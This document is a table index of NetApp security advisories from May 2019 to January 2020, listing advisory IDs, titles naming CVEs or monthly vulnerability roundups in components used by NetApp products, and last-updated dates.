| [**NTAP-20200127-0004**](https://security.netapp.com/advisory/ntap-20200127-0004/) | CVE-2019-20330 FasterXML jackson-databind Vulnerability in NetApp Products | 2021-02-01 |
| [**NTAP-20200127-0003**](https://security.netapp.com/advisory/ntap-20200127-0003/) | CVE-2019-20372 NGINX vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20200127-0001**](https://security.netapp.com/advisory/ntap-20200127-0001/) | CVE-2020-6750 GNOME GLib Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200122-0003**](https://security.netapp.com/advisory/ntap-20200122-0003/) | January 2020 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2022-03-07 |
| [**NTAP-20200122-0002**](https://security.netapp.com/advisory/ntap-20200122-0002/) | January 2020 MySQL Vulnerabilities in NetApp Products | 2020-12-04 |
| [**NTAP-20200122-0001**](https://security.netapp.com/advisory/ntap-20200122-0001/) | January 2020 Samba Vulnerabilities in NetApp Products | 2020-01-22 |
| [**NTAP-20200120-0001**](https://security.netapp.com/advisory/ntap-20200120-0001/) | October 2019 Tcpdump Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20200115-0001**](https://security.netapp.com/advisory/ntap-20200115-0001/) | CVE-2019-18218 File Vulnerability in NetApp Products | 2020-03-16 |
| [**NTAP-20200115-0002**](https://security.netapp.com/advisory/ntap-20200115-0002/) | CVE-2019-5094 E2FSProgs Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20200114-0001**](https://security.netapp.com/advisory/ntap-20200114-0001/) | CVE-2019-19880 SQLite Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200114-0002**](https://security.netapp.com/advisory/ntap-20200114-0002/) | CVE-2019-19956 Libxml2 Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20200114-0003**](https://security.netapp.com/advisory/ntap-20200114-0003/) | January 2020 SQLite Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20200110-0001**](https://security.netapp.com/advisory/ntap-20200110-0001/) | CVE-2019-17571 Apache Log4j Vulnerability in NetApp Products | 2021-05-19 |
| [**NTAP-20200110-0003**](https://security.netapp.com/advisory/ntap-20200110-0003/) | CVE-2019-19844 Django Vulnerability in NetApp Products | 2020-09-01 |
| [**NTAP-20200110-0002**](https://security.netapp.com/advisory/ntap-20200110-0002/) | CVE-2019-4343 IBM Cognos Analytics Vulnerability in NetApp Products | 2020-06-02 |
| [**NTAP-20200107-0001**](https://security.netapp.com/advisory/ntap-20200107-0001/) | January 2020 Apache Tomcat Vulnerabilities in NetApp Products | 2021-01-04 |
| [**NTAP-20200103-0003**](https://security.netapp.com/advisory/ntap-20200103-0003/) | December 2019 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2020-06-02 |
| [**NTAP-20200103-0001**](https://security.netapp.com/advisory/ntap-20200103-0001/) | December 2019 Linux Kernel Vulnerabilities in NetApp Products | 2022-06-09 |
| [**NTAP-20200103-0002**](https://security.netapp.com/advisory/ntap-20200103-0002/) | December 2019 PHP Vulnerabilities in NetApp Products | 2020-01-03 |
| [**NTAP-20200103-0004**](https://security.netapp.com/advisory/ntap-20200103-0004/) | December 2019 Sudo Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20191223-0001**](https://security.netapp.com/advisory/ntap-20191223-0001/) | December 2019 SQLite Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20191217-0001**](https://security.netapp.com/advisory/ntap-20191217-0001/) | CVE-2019-11157 Intel Processor Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20191217-0002**](https://security.netapp.com/advisory/ntap-20191217-0002/) | CVE-2019-14607 Intel Processor Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20191217-0003**](https://security.netapp.com/advisory/ntap-20191217-0003/) | CVE-2019-19118 Django Vulnerability in NetApp Products | 2020-09-01 |
| [**NTAP-20191213-0001**](https://security.netapp.com/advisory/ntap-20191213-0001/) | Intel SA-00241 CSME-SPS-TXE-AMT Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20191210-0001**](https://security.netapp.com/advisory/ntap-20191210-0001/) | CVE-2019-1551 OpenSSL Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20191210-0002**](https://security.netapp.com/advisory/ntap-20191210-0002/) | December 2019 Samba Vulnerabilities in NetApp Products | 2019-12-10 |
| [**NTAP-20191205-0001**](https://security.netapp.com/advisory/ntap-20191205-0001/) | November 2019 Linux Kernel Vulnerabilities in NetApp Products | 2023-05-19 |
| [**NTAP-20191127-0002**](https://security.netapp.com/advisory/ntap-20191127-0002/) | CVE-2019-17592 Nodejs Vulnerability in NetApp Products | 2020-07-09 |
| [**NTAP-20191127-0001**](https://security.netapp.com/advisory/ntap-20191127-0001/) | November 2019 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2020-06-02 |
| [**NTAP-20191127-0003**](https://security.netapp.com/advisory/ntap-20191127-0003/) | October 2019 PuTTY Vulnerabilities in NetApp Products | 2021-02-11 |
| [**NTAP-20191122-0002**](https://security.netapp.com/advisory/ntap-20191122-0002/) | CVE-2018-21029 Systemd Vulnerability in NetApp Products | 2019-12-20 |
| [**NTAP-20191122-0004**](https://security.netapp.com/advisory/ntap-20191122-0004/) | CVE-2019-16276 Golang Vulnerability in NetApp Products | 2019-11-22 |
| [**NTAP-20191122-0005**](https://security.netapp.com/advisory/ntap-20191122-0005/) | CVE-2019-17596 Golang Vulnerability in NetApp Products | 2019-11-22 |
| [**NTAP-20191122-0001**](https://security.netapp.com/advisory/ntap-20191122-0001/) | CVE-2019-6477 ISC BIND Vulnerability in NetApp Products | 2020-09-01 |
| [**NTAP-20191122-0003**](https://security.netapp.com/advisory/ntap-20191122-0003/) | November 2019 Ruby Vulnerabilities in NetApp Products | 2019-11-22 |
| [**NTAP-20191121-0002**](https://security.netapp.com/advisory/ntap-20191121-0002/) | CVE-2019-17272 Privilege Escalation Vulnerability in ONTAP Select Deploy administration utility | 2019-11-21 |
| [**NTAP-20191121-0001**](https://security.netapp.com/advisory/ntap-20191121-0001/) | CVE-2019-5509 Unauthenticated Remote Code Injection Vulnerability in ONTAP Select Deploy administration utility | 2019-11-21 |
| [**NTAP-20191113-0007**](https://security.netapp.com/advisory/ntap-20191113-0007/) | Intel SA-00164 Intel Processor Vulnerability in NetApp Products | 2020-04-22 |
| [**NTAP-20191113-0003**](https://security.netapp.com/advisory/ntap-20191113-0003/) | Intel SA-00210 Processor Vulnerability in NetApp Products | 2020-06-08 |
| [**NTAP-20191113-0006**](https://security.netapp.com/advisory/ntap-20191113-0006/) | Intel SA-00219 Intel Processor Vulnerability in NetApp Products | 2020-04-22 |
| [**NTAP-20191113-0002**](https://security.netapp.com/advisory/ntap-20191113-0002/) | Intel SA-00240 Processor Vulnerabilities in NetApp Products | 2020-06-08 |
| [**NTAP-20191113-0008**](https://security.netapp.com/advisory/ntap-20191113-0008/) | Intel SA-00254 Intel Processor Vulnerability in NetApp Products | 2020-04-20 |
| [**NTAP-20191113-0001**](https://security.netapp.com/advisory/ntap-20191113-0001/) | Intel SA-00255 Ethernet Controller Vulnerabilities in NetApp Products | 2020-08-07 |
| [**NTAP-20191113-0009**](https://security.netapp.com/advisory/ntap-20191113-0009/) | Intel SA-00270 Intel Processor Vulnerability in NetApp Products | 2021-04-08 |
| [**NTAP-20191113-0005**](https://security.netapp.com/advisory/ntap-20191113-0005/) | Intel SA-00271 Intel Processor Vulnerability in NetApp Products | 2022-10-24 |
| [**NTAP-20191113-0004**](https://security.netapp.com/advisory/ntap-20191113-0004/) | Intel SA-00280 Firmware Vulnerabilities in NetApp Products | 2020-04-21 |
| [**NTAP-20191107-0001**](https://security.netapp.com/advisory/ntap-20191107-0001/) | CVE-2004-1653 OpenSSH Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20191107-0003**](https://security.netapp.com/advisory/ntap-20191107-0003/) | CVE-2007-2243 OpenSSH Vulnerability in NetApp Products | 2022-01-14 |
| [**NTAP-20191107-0002**](https://security.netapp.com/advisory/ntap-20191107-0002/) | CVE-2007-2768 OpenSSH Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20191107-0005**](https://security.netapp.com/advisory/ntap-20191107-0005/) | CVE-2019-17514 Python Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20191107-0004**](https://security.netapp.com/advisory/ntap-20191107-0004/) | CVE-2019-18348 Python Vulnerability in NetApp Products | 2021-05-19 |
| [**NTAP-20191031-0003**](https://security.netapp.com/advisory/ntap-20191031-0003/) | CVE-2019-11043 PHP Vulnerability in NetApp Products | 2019-10-31 |
| [**NTAP-20191031-0006**](https://security.netapp.com/advisory/ntap-20191031-0006/) | CVE-2019-11253 Kubernetes Vulnerability in NetApp Products | 2020-11-17 |
| [**NTAP-20191031-0002**](https://security.netapp.com/advisory/ntap-20191031-0002/) | CVE-2019-14847 Samba Vulnerability in NetApp Products | 2019-10-31 |
| [**NTAP-20191031-0004**](https://security.netapp.com/advisory/ntap-20191031-0004/) | CVE-2019-18197 Libxslt Vulnerability in NetApp Products | 2021-11-29 |
| [**NTAP-20191031-0005**](https://security.netapp.com/advisory/ntap-20191031-0005/) | October 2019 Linux Kernel Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20191031-0001**](https://security.netapp.com/advisory/ntap-20191031-0001/) | October 2019 Samba Vulnerabilities in NetApp Products | 2019-10-31 |
| [**NTAP-20191024-0003**](https://security.netapp.com/advisory/ntap-20191024-0003/) | CVE-2019-16905 OpenSSH Pre-Auth Integer Overflow Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20191024-0006**](https://security.netapp.com/advisory/ntap-20191024-0006/) | CVE-2019-17359 Bouncy Castle Vulnerability in NetApp Products | 2021-01-27 |
| [**NTAP-20191024-0005**](https://security.netapp.com/advisory/ntap-20191024-0005/) | CVE-2019-17531 FasterXML jackson-databind Vulnerability in NetApp Products | 2021-01-28 |
| [**NTAP-20191024-0001**](https://security.netapp.com/advisory/ntap-20191024-0001/) | CVE-2019-5508 L2ping Denial of Service Vulnerability in Clustered Data ONTAP 9.2 and higher | 2019-12-03 |
| [**NTAP-20191024-0002**](https://security.netapp.com/advisory/ntap-20191024-0002/) | October 2019 GNU Binutils Vulnerabilities in NetApp Products | 2024-01-02 |
| [**NTAP-20191024-0004**](https://security.netapp.com/advisory/ntap-20191024-0004/) | October 2019 ISC BIND Vulnerabilities in NetApp Products | 2020-09-01 |
| [**NTAP-20191017-0003**](https://security.netapp.com/advisory/ntap-20191017-0003/) | CVE-2019-14287 Sudo Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20191017-0005**](https://security.netapp.com/advisory/ntap-20191017-0005/) | CVE-2019-15138 Nodejs Vulnerability in NetApp Products | 2020-07-09 |
| [**NTAP-20191017-0004**](https://security.netapp.com/advisory/ntap-20191017-0004/) | CVE-2019-16935 Python Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20191017-0006**](https://security.netapp.com/advisory/ntap-20191017-0006/) | October 2019 FasterXML jackson-databind Vulnerabilities in NetApp Products | 2021-03-24 |
| [**NTAP-20191017-0001**](https://security.netapp.com/advisory/ntap-20191017-0001/) | October 2019 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20191017-0002**](https://security.netapp.com/advisory/ntap-20191017-0002/) | October 2019 MySQL Vulnerabilities in NetApp Products | 2021-01-18 |
| [**NTAP-20191009-0002**](https://security.netapp.com/advisory/ntap-20191009-0002/) | CVE-2019-15635 Grafana Vulnerability in NetApp Products | 2019-10-09 |
| [**NTAP-20191009-0003**](https://security.netapp.com/advisory/ntap-20191009-0003/) | CVE-2019-5506 Hostname Verification Vulnerability in Clustered Data ONTAP 9.0 and higher | 2019-10-10 |
| [**NTAP-20191009-0004**](https://security.netapp.com/advisory/ntap-20191009-0004/) | CVE-2019-5507 Sensitive Information Disclosure Vulnerability in SnapManager for Oracle | 2019-10-09 |
| [**NTAP-20191009-0001**](https://security.netapp.com/advisory/ntap-20191009-0001/) | September 2019 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2019-12-16 |
| [**NTAP-20191004-0005**](https://security.netapp.com/advisory/ntap-20191004-0005/) | CVE-2019-10744 Lodash Vulnerability in NetApp Products | 2021-09-17 |
| [**NTAP-20191004-0004**](https://security.netapp.com/advisory/ntap-20191004-0004/) | CVE-2019-15043 Grafana Vulnerability in NetApp Products | 2020-05-28 |
| [**NTAP-20191004-0003**](https://security.netapp.com/advisory/ntap-20191004-0003/) | September 2019 curl/libcurl Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20191004-0006**](https://security.netapp.com/advisory/ntap-20191004-0006/) | September 2019 Dropbear SSH Vulnerabilities in NetApp Products | 2021-07-02 |
| [**NTAP-20191004-0002**](https://security.netapp.com/advisory/ntap-20191004-0002/) | September 2019 FasterXML jackson-databind Vulnerabilities in NetApp Products | 2021-02-09 |
| [**NTAP-20191004-0001**](https://security.netapp.com/advisory/ntap-20191004-0001/) | September 2019 Linux Kernel Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20190926-0002**](https://security.netapp.com/advisory/ntap-20190926-0002/) | CVE-2019-12401 Apache Solr Vulnerability in NetApp Products | 2019-09-26 |
| [**NTAP-20190926-0004**](https://security.netapp.com/advisory/ntap-20190926-0004/) | CVE-2019-15903 Expat Vulnerability in NetApp Products | 2021-11-01 |
| [**NTAP-20190926-0005**](https://security.netapp.com/advisory/ntap-20190926-0005/) | CVE-2019-16056 Python Vulnerability in NetApp Products | 2020-04-17 |
| [**NTAP-20190926-0003**](https://security.netapp.com/advisory/ntap-20190926-0003/) | CVE-2019-16168 SQLite Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20190926-0001**](https://security.netapp.com/advisory/ntap-20190926-0001/) | Intel SA-00290 Intel Processor Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20190923-0001**](https://security.netapp.com/advisory/ntap-20190923-0001/) | CVE-2019-5504 Unauthenticated Remote Command Execution Vulnerability in ONTAP Select Deploy administration utility | 2019-09-23 |
| [**NTAP-20190923-0002**](https://security.netapp.com/advisory/ntap-20190923-0002/) | CVE-2019-5505 Sensitive Information Disclosure Vulnerability in ONTAP Select Deploy administration utility | 2019-09-23 |
| [**NTAP-20190919-0005**](https://security.netapp.com/advisory/ntap-20190919-0005/) | CVE-2013-4786 IPMI RAKP Vulnerability in NetApp Products | 2023-06-09 |
| [**NTAP-20190919-0001**](https://security.netapp.com/advisory/ntap-20190919-0001/) | CVE-2019-11358 jQuery Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20190919-0003**](https://security.netapp.com/advisory/ntap-20190919-0003/) | September 2019 Kubernetes Vulnerabilities in NetApp Products | 2020-11-17 |
| [**NTAP-20190919-0004**](https://security.netapp.com/advisory/ntap-20190919-0004/) | September 2019 Lodash Vulnerabilities in NetApp Products | 2021-09-17 |
| [**NTAP-20190919-0002**](https://security.netapp.com/advisory/ntap-20190919-0002/) | September 2019 OpenSSL Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20190910-0004**](https://security.netapp.com/advisory/ntap-20190910-0004/) | CVE-2019-10071 Apache Tapestry Vulnerability in NetApp Products | 2020-05-18 |
| [**NTAP-20190910-0003**](https://security.netapp.com/advisory/ntap-20190910-0003/) | CVE-2019-12400 Apache Santuario Vulnerability in NetApp Products | 2020-09-14 |
| [**NTAP-20190910-0001**](https://security.netapp.com/advisory/ntap-20190910-0001/) | CVE-2019-13139 Docker Vulnerability in NetApp Products | 2019-09-10 |
| [**NTAP-20190910-0002**](https://security.netapp.com/advisory/ntap-20190910-0002/) | September 2019 FreeBSD Vulnerabilities in NetApp Products | 2020-01-24 |
| [**NTAP-20190909-0001**](https://security.netapp.com/advisory/ntap-20190909-0001/) | CVE-2019-5503 Missing HTTP Security Headers in OnCommand Workflow Automation | 2019-09-09 |
| [**NTAP-20190905-0002**](https://security.netapp.com/advisory/ntap-20190905-0002/) | August 2019 Linux Kernel Vulnerabilities in NetApp Products | 2024-05-01 |
| [**NTAP-20190905-0001**](https://security.netapp.com/advisory/ntap-20190905-0001/) | CVE-2019-8460 OpenBSD Vulnerability in NetApp Products | 2021-01-15 |
| [**NTAP-20190905-0003**](https://security.netapp.com/advisory/ntap-20190905-0003/) | September 2019 Apache HTTP Server Vulnerabilities in NetApp Products | 2020-12-16 |
| [**NTAP-20190903-0002**](https://security.netapp.com/advisory/ntap-20190903-0002/) | August 2019 IBM Informix Dynamic Server Vulnerabilities in NetApp Products | 2020-01-27 |
| [**NTAP-20190903-0003**](https://security.netapp.com/advisory/ntap-20190903-0003/) | CVE-2015-4620 ISC Bind Vulnerability in NetApp Products | 2019-09-03 |
| [**NTAP-20190903-0001**](https://security.netapp.com/advisory/ntap-20190903-0001/) | CVE-2019-10197 Samba Vulnerability in NetApp Products | 2019-09-03 |
| [**NTAP-20190830-0002**](https://security.netapp.com/advisory/ntap-20190830-0002/) | CVE-2018-5738 ISC BIND Vulnerability in NetApp Products | 2019-08-30 |
| [**NTAP-20190830-0001**](https://security.netapp.com/advisory/ntap-20190830-0001/) | CVE-2018-5741 ISC BIND Vulnerability in NetApp Products | 2019-08-30 |
| [**NTAP-20190830-0003**](https://security.netapp.com/advisory/ntap-20190830-0003/) | July 2017 ISC BIND Vulnerabilities in NetApp Products | 2019-08-30 |
| [**NTAP-20190828-0004**](https://security.netapp.com/advisory/ntap-20190828-0004/) | August 2019 Apache Tika Vulnerabilities in NetApp Products | 2019-08-28 |
| [**NTAP-20190828-0002**](https://security.netapp.com/advisory/ntap-20190828-0002/) | August 2019 Django Vulnerabilities in NetApp Products | 2020-01-09 |
| [**NTAP-20190828-0003**](https://security.netapp.com/advisory/ntap-20190828-0003/) | August 2019 Docker Vulnerabilities in NetApp Products | 2020-05-19 |
| [**NTAP-20190828-0001**](https://security.netapp.com/advisory/ntap-20190828-0001/) | August 2019 GNU patch Vulnerabilities in NetApp Products | 2019-11-19 |
| [**NTAP-20190823-0004**](https://security.netapp.com/advisory/ntap-20190823-0004/) | August 2019 Golang Vulnerabilities in NetApp Products | 2020-05-28 |
| [**NTAP-20190823-0001**](https://security.netapp.com/advisory/ntap-20190823-0001/) | August 2019 Kubernetes Vulnerabilities in NetApp Products | 2020-11-17 |
| [**NTAP-20190823-0002**](https://security.netapp.com/advisory/ntap-20190823-0002/) | August 2019 NGINX Vulnerabilities in NetApp Products | 2024-01-02 |
| [**NTAP-20190823-0005**](https://security.netapp.com/advisory/ntap-20190823-0005/) | August 2019 Node.js Vulnerabilities in NetApp Products | 2021-07-22 |
| [**NTAP-20190823-0006**](https://security.netapp.com/advisory/ntap-20190823-0006/) | CVE-2019-1552 OpenSSL Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20190823-0003**](https://security.netapp.com/advisory/ntap-20190823-0003/) | CVE-2019-9517 Apache HTTP Server Vulnerability in NetApp Products | 2019-09-09 |
| [**NTAP-20190822-0002**](https://security.netapp.com/advisory/ntap-20190822-0002/) | August 2019 GNU Binutils Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20190822-0003**](https://security.netapp.com/advisory/ntap-20190822-0003/) | August 2019 PHP Vulnerabilities in NetApp Products | 2019-08-22 |
| [**NTAP-20190822-0001**](https://security.netapp.com/advisory/ntap-20190822-0001/) | CVE-2019-1010204 GNU Binutils Vulnerability in NetApp Products | 2020-08-18 |
| [**NTAP-20190822-0004**](https://security.netapp.com/advisory/ntap-20190822-0004/) | CVE-2019-13057 OpenLDAP Vulnerability in NetApp Products | 2019-09-09 |
| [**NTAP-20190814-0001**](https://security.netapp.com/advisory/ntap-20190814-0001/) | August 2019 FasterXML jackson-databind Vulnerabilities in NetApp Products | 2020-12-18 |
| [**NTAP-20190814-0003**](https://security.netapp.com/advisory/ntap-20190814-0003/) | August 2019 FreeBSD Vulnerabilities in NetApp Products | 2019-08-14 |
| [**NTAP-20190814-0002**](https://security.netapp.com/advisory/ntap-20190814-0002/) | CVE-2019-13232 Info-ZIP UnZip Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20190814-0004**](https://security.netapp.com/advisory/ntap-20190814-0004/) | February 2019 ISC BIND Vulnerabilities in NetApp Products | 2019-08-14 |
| [**NTAP-20190809-0002**](https://security.netapp.com/advisory/ntap-20190809-0002/) | CVE-2019-1125 SWAPGS Speculative Execution Side Channel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20190809-0001**](https://security.netapp.com/advisory/ntap-20190809-0001/) | CVE-2019-5498 Sensitive Information Disclosure Vulnerability in OnCommand Insight | 2019-08-09 |
| [**NTAP-20190806-0003**](https://security.netapp.com/advisory/ntap-20190806-0003/) | CVE-2019-13012 GNOME GLib Vulnerability in NetApp Products | 2019-08-06 |
| [**NTAP-20190806-0002**](https://security.netapp.com/advisory/ntap-20190806-0002/) | CVE-2019-13115 Libssh2 Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20190806-0004**](https://security.netapp.com/advisory/ntap-20190806-0004/) | July 2019 Libxslt Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20190806-0001**](https://security.netapp.com/advisory/ntap-20190806-0001/) | July 2019 Linux Kernel Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20190802-0001**](https://security.netapp.com/advisory/ntap-20190802-0001/) | August 2019 VxWorks TCP/IP Stack (IPNET) Vulnerabilities in NetApp Products | 2019-10-22 |
| [**NTAP-20190802-0003**](https://security.netapp.com/advisory/ntap-20190802-0003/) | CVE-2019-5500 Denial of Service (DoS) Vulnerability in the NetApp Service Processor and Baseboard Management Controller | 2019-11-05 |
| [**NTAP-20190802-0002**](https://security.netapp.com/advisory/ntap-20190802-0002/) | CVE-2019-5502 Insecure SMB Cryptography Vulnerability in Data ONTAP operating in 7-Mode | 2019-08-02 |
| [**NTAP-20190801-0002**](https://security.netapp.com/advisory/ntap-20190801-0002/) | CVE-2019-5493 Information Disclosure Vulnerability in Data ONTAP operating in 7-Mode | 2019-08-01 |
| [**NTAP-20190801-0001**](https://security.netapp.com/advisory/ntap-20190801-0001/) | CVE-2019-5501 Sensitive Information Disclosure Vulnerability in Data ONTAP operating in 7-Mode | 2019-08-01 |
| [**NTAP-20190731-0001**](https://security.netapp.com/advisory/ntap-20190731-0001/) | Intel SA-00063 Ethernet Controller Vulnerability in NetApp Products | 2021-01-05 |
| [**NTAP-20190730-0002**](https://security.netapp.com/advisory/ntap-20190730-0002/) | December 2014 ISC BIND Vulnerabilities in NetApp Products | 2019-07-30 |
| [**NTAP-20190730-0001**](https://security.netapp.com/advisory/ntap-20190730-0001/) | September 2015 ISC BIND Vulnerabilities in NetApp Products | 2019-07-30 |
| [**NTAP-20190719-0001**](https://security.netapp.com/advisory/ntap-20190719-0001/) | April 2018 Libxml2 Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20190719-0002**](https://security.netapp.com/advisory/ntap-20190719-0002/) | CVE-2018-14404 Libxml2 Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20190719-0005**](https://security.netapp.com/advisory/ntap-20190719-0005/) | July 2019 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20190719-0004**](https://security.netapp.com/advisory/ntap-20190719-0004/) | July 2019 MySQL Vulnerabilities in NetApp Products | 2021-01-19 |
| [**NTAP-20190719-0003**](https://security.netapp.com/advisory/ntap-20190719-0003/) | May 2019 Linux Kernel Vulnerabilities in NetApp Products | 2020-06-12 |
| [**NTAP-20190715-0001**](https://security.netapp.com/advisory/ntap-20190715-0001/) | CVE-2018-20801 Highcharts Vulnerability in NetApp Products | 2020-12-11 |
| [**NTAP-20190710-0001**](https://security.netapp.com/advisory/ntap-20190710-0001/) | CVE-2019-13068 Grafana Vulnerability in NetApp Products | 2020-05-28 |
| [**NTAP-20190710-0002**](https://security.netapp.com/advisory/ntap-20190710-0002/) | June 2019 Linux Kernel Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20190705-0002**](https://security.netapp.com/advisory/ntap-20190705-0002/) | CVE-2019-12781 Django Vulnerability in NetApp Products | 2019-07-16 |
| [**NTAP-20190705-0001**](https://security.netapp.com/advisory/ntap-20190705-0001/) | July 2019 Libvirt Vulnerabilities in NetApp Products | 2019-07-05 |
| [**NTAP-20190703-0001**](https://security.netapp.com/advisory/ntap-20190703-0001/) | CVE-2018-20843 Expat Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20190703-0002**](https://security.netapp.com/advisory/ntap-20190703-0002/) | CVE-2019-12384 FasterXML jackson-databind Vulnerability in NetApp Products | 2021-11-02 |
| [**NTAP-20190627-0001**](https://security.netapp.com/advisory/ntap-20190627-0001/) | CVE-2019-5497 Default Privileged Account Vulnerability in the NetApp AFF A700s Baseboard Management Controller | 2019-08-14 |
| [**NTAP-20190625-0007**](https://security.netapp.com/advisory/ntap-20190625-0007/) | CVE-2019-0220 Apache HTTP Server Vulnerability in NetApp Products | 2021-05-19 |
| [**NTAP-20190625-0002**](https://security.netapp.com/advisory/ntap-20190625-0002/) | CVE-2019-10072 Apache Tomcat Vulnerability in NetApp Products | 2020-04-23 |
| [**NTAP-20190625-0006**](https://security.netapp.com/advisory/ntap-20190625-0006/) | CVE-2019-12814 FasterXML jackson-databind Vulnerability in NetApp Products | 2021-07-13 |
| [**NTAP-20190625-0005**](https://security.netapp.com/advisory/ntap-20190625-0005/) | CVE-2019-12875 Alpine Linux Vulnerability in NetApp Products | 2019-07-10 |
| [**NTAP-20190625-0004**](https://security.netapp.com/advisory/ntap-20190625-0004/) | CVE-2019-5599 FreeBSD TCP SACK Vulnerability in NetApp Products | 2019-06-25 |
| [**NTAP-20190625-0003**](https://security.netapp.com/advisory/ntap-20190625-0003/) | CVE-2019-6471 ISC Bind Vulnerability in NetApp Products | 2019-07-15 |
| [**NTAP-20190625-0001**](https://security.netapp.com/advisory/ntap-20190625-0001/) | Linux Kernel TCP SACK Panic Vulnerabilities in NetApp Products | 2022-01-14 |
| [**NTAP-20190619-0003**](https://security.netapp.com/advisory/ntap-20190619-0003/) | CVE-2018-11802 Apache Solr Vulnerability in NetApp Products | 2019-06-19 |
| [**NTAP-20190619-0001**](https://security.netapp.com/advisory/ntap-20190619-0001/) | CVE-2019-0201 Apache ZooKeeper Vulnerability in NetApp Products | 2021-05-12 |
| [**NTAP-20190619-0004**](https://security.netapp.com/advisory/ntap-20190619-0004/) | CVE-2019-3829 GnuTLS Vulnerability in NetApp Products | 2020-09-14 |
| [**NTAP-20190619-0005**](https://security.netapp.com/advisory/ntap-20190619-0005/) | CVE-2019-9740 Python Vulnerability in NetApp Products | 2020-03-27 |
| [**NTAP-20190619-0006**](https://security.netapp.com/advisory/ntap-20190619-0006/) | June 2019 Samba Vulnerabilities in NetApp Products | 2019-06-19 |
| [**NTAP-20190619-0002**](https://security.netapp.com/advisory/ntap-20190619-0002/) | May 2019 Systemd Vulnerabilities in NetApp Products | 2020-08-18 |
| [**NTAP-20190617-0001**](https://security.netapp.com/advisory/ntap-20190617-0001/) | CVE-2018-8029 Apache Hadoop Vulnerability in NetApp Products | 2019-06-17 |
| [**NTAP-20190617-0003**](https://security.netapp.com/advisory/ntap-20190617-0003/) | CVE-2019-10160 Python Vulnerability in NetApp Products | 2022-12-19 |
| [**NTAP-20190617-0004**](https://security.netapp.com/advisory/ntap-20190617-0004/) | CVE-2019-4139 IBM Cognos Analytics Vulnerability in NetApp Products | 2019-08-09 |
| [**NTAP-20190617-0002**](https://security.netapp.com/advisory/ntap-20190617-0002/) | June 2019 Apache HTTP Server Vulnerabilities in NetApp Products | 2021-05-19 |
| [**NTAP-20190612-0001**](https://security.netapp.com/advisory/ntap-20190612-0001/) | Intel SA-00247 Processor Vulnerability in NetApp Products | 2020-05-07 |
| [**NTAP-20190611-0002**](https://security.netapp.com/advisory/ntap-20190611-0002/) | CVE-2018-10934 JBoss Enterprise Application Platform Vulnerability in NetApp Products | 2021-01-19 |
| [**NTAP-20190611-0003**](https://security.netapp.com/advisory/ntap-20190611-0003/) | CVE-2019-9628 XMLTooling Library Vulnerability in NetApp Products | 2019-06-11 |
| [**NTAP-20190611-0001**](https://security.netapp.com/advisory/ntap-20190611-0001/) | May 2019 FreeBSD Vulnerabilities in NetApp Products | 2019-06-11 |
| [**NTAP-20190606-0001**](https://security.netapp.com/advisory/ntap-20190606-0001/) | CVE-2019-0221 Apache Tomcat Vulnerability in NetApp Products | 2021-01-04 |
| [**NTAP-20190606-0003**](https://security.netapp.com/advisory/ntap-20190606-0003/) | CVE-2019-12450 GNOME GLib Vulnerability in NetApp Products | 2019-07-03 |
| [**NTAP-20190606-0002**](https://security.netapp.com/advisory/ntap-20190606-0002/) | CVE-2019-8457 SQLite Vulnerability in NetApp Products | 2020-10-07 |
| [**NTAP-20190606-0004**](https://security.netapp.com/advisory/ntap-20190606-0004/) | May 2019 curl/libcurl Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20190530-0001**](https://security.netapp.com/advisory/ntap-20190530-0001/) | CVE-2018-1000632 Dom4j Vulnerability in NetApp Products | 2021-08-16 |
| [**NTAP-20190530-0002**](https://security.netapp.com/advisory/ntap-20190530-0002/) | CVE-2018-20839 Systemd Vulnerability in NetApp Products | 2020-05-22 |
| [**NTAP-20190530-0003**](https://security.netapp.com/advisory/ntap-20190530-0003/) | May 2019 FasterXML jackson-databind Vulnerabilities in NetApp Products | 2021-01-18 |
| [**NTAP-20190521-0001**](https://security.netapp.com/advisory/ntap-20190521-0001/) | CVE-2019-5018 SQLite Vulnerability in NetApp Products | 2019-08-07 |
